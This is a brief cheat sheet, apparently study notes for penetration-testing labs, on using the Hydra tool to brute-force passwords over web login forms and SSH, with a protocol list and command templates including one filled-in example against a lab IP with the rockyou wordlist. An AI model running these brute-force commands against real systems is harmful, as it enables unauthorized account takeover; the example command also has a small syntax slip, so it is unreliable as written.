# [Overview](https://en.kali.tools/?p=220)
* Hydra is a brute force online password cracking program.
* Ability to brute force a whole lot of protocols:
```
Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,  HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP.
```
	
# Https Post Form
* General syntax: `hydra -l <username> -P <wordlist> <Target IP> http-post-form "<URL PATH>:<Post Arg>=^<KEY>^:<TAGS>`
	* Example: `hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login:username^USER^&password=^PASS^:F=incorrect"`

# SSH
* General syntax: `hydra -l <username> -P <absolute path to passwords file> <Target IP> -t <thread count> ssh`

